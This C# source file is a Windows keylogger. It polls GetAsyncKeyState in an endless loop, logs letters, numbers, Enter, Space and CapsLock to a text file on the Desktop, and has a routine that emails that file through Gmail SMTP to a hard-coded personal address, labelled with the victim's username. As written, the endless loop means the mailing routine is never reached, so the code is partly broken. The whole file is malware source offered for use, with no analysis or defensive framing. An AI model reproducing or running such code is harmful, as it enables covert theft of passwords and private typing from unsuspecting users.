    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static string path = (Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\lel.txt");
        static void Main(string[] args)
        {
            Keylogger();
            mail();
        }
        static void mail()
        {
            Thread.Sleep(60000);
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            MailMessage mail = new MailMessage();
            mail.To.Add("gauthier.cremers1@gmail.com");
            mail.From = new MailAddress("gauthier.cremers1@gmail.com", "gauthier", System.Text.Encoding.UTF8);
            mail.Subject = "Keylog from " + userName;
            mail.SubjectEncoding = System.Text.Encoding.UTF8;
            mail.Body = "Keylogged!";
            mail.BodyEncoding = System.Text.Encoding.UTF8;
            mail.IsBodyHtml = false;
            mail.Priority = MailPriority.High;
            SmtpClient client = new SmtpClient();
            client.Credentials = new System.Net.NetworkCredential("gauthier.cremers1@gmail.com", "password");
            client.Port = 587;
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            Attachment data = new Attachment(path);
            mail.Attachments.Add(data);
            client.Send(mail);
        }
        static void Keylogger()
        {
            StreamWriter sw = new StreamWriter(path);
            while (true)
            {
                Thread.Sleep(50);
                for (Int32 i = 0; i < 255; i++)
                {
                    
                    int KeySt = GetAsyncKeyState(i);
                    if (KeySt == 1 || KeySt == -32767)
                    {
                        if (((Keys)i) == Keys.A)
                        {
                            sw.Write("a");
                        }
                        else if (((Keys)i) == Keys.B)
                        {
                            sw.Write("b");
                        }
                         
                        else if (((Keys)i) == Keys.C)
                        {
                            sw.Write("c");
                        }
                        else if (((Keys)i) == Keys.D)
                        {
                            sw.Write("d");
                        }
                        else if (((Keys)i) == Keys.E)
                        {
                            sw.Write("e");
                        }
                        else if (((Keys)i) == Keys.F)
                        {
                            sw.Write("f");
                        }
                        else if (((Keys)i) == Keys.G)
                        {
                            sw.Write("g");
                        }
                        else if (((Keys)i) == Keys.H)
                        {
                            sw.Write("h");
                        }
                        else if (((Keys)i) == Keys.I)
                        {
                            sw.Write("i");
                        }
                        else if (((Keys)i) == Keys.J)
                        {
                            sw.Write("j");
                        }
                        else if (((Keys)i) == Keys.K)
                        {
                            sw.Write("k");
                        }
                        else if (((Keys)i) == Keys.L)
                        {
                            sw.Write("l");
                        }
                        else if (((Keys)i) == Keys.M)
                        {
                            sw.Write("m");
                        }
                        else if (((Keys)i) == Keys.N)
                        {
                            sw.Write("n");
                        }
                        else if (((Keys)i) == Keys.O)
                        {
                            sw.Write("o");
                        }
                        else if (((Keys)i) == Keys.P)
                        {
                            sw.Write("p");
                        }
                        else if (((Keys)i) == Keys.Q)
                        {
                            sw.Write("q");
                        }
                        else if (((Keys)i) == Keys.R)
                        {
                            sw.Write("r");
                        }
                        else if (((Keys)i) == Keys.S)
                        {
                            sw.Write("s");
                        }
                        else if (((Keys)i) == Keys.T)
                        {
                            sw.Write("t");
                        }
                        else if (((Keys)i) == Keys.U)
                        {
                            sw.Write("u");
                        }
                        else if (((Keys)i) == Keys.V)
                        {
                            sw.Write("v");
                        }
                        else if (((Keys)i) == Keys.W)
                        {
                            sw.Write("w");
                        }
                        else if (((Keys)i) == Keys.X)
                        {
                            sw.Write("x");
                        }
                        else if (((Keys)i) == Keys.Y)
                        {
                            sw.Write("y");
                        }
                        else if (((Keys)i) == Keys.Z)
                        {
                            sw.Write("z");
                        }
                        else if (((Keys)i) == Keys.Enter)
                        {
                            sw.Write(Environment.NewLine);
                        }
                        else if (((Keys)i) == Keys.Space)
                        {
                            sw.Write(" ");
                        }
                        else if (((Keys)i) == Keys.NumPad0)
                        {
                            sw.Write("0");
                        }
                        else if (((Keys)i) == Keys.NumPad1)
                        {
                            sw.Write("1");
                        }
                        else if (((Keys)i) == Keys.NumPad2)
                        {
                            sw.Write("2");
                        }
                        else if (((Keys)i) == Keys.NumPad3)
                        {
                            sw.Write("3");
                        }
                        else if (((Keys)i) == Keys.NumPad4)
                        {
                            sw.Write("4");
                        }
                        else if (((Keys)i) == Keys.NumPad5)
                        {
                            sw.Write("5");
                        }
                        else if (((Keys)i) == Keys.NumPad6)
                        {
                            sw.Write("6");
                        }
                        else if (((Keys)i) == Keys.NumPad7)
                        {
                            sw.Write("7");
                        }
                        else if (((Keys)i) == Keys.NumPad8)
                        {
                            sw.Write("8");
                        }
                        else if (((Keys)i) == Keys.NumPad9)
                        {
                            sw.Write("9");
                        }
                        else if (((Keys)i) == Keys.CapsLock)
                        {
                            sw.Write("[CL]");
                        }
                        sw.Flush();
                    }
                }
                
            }
        }
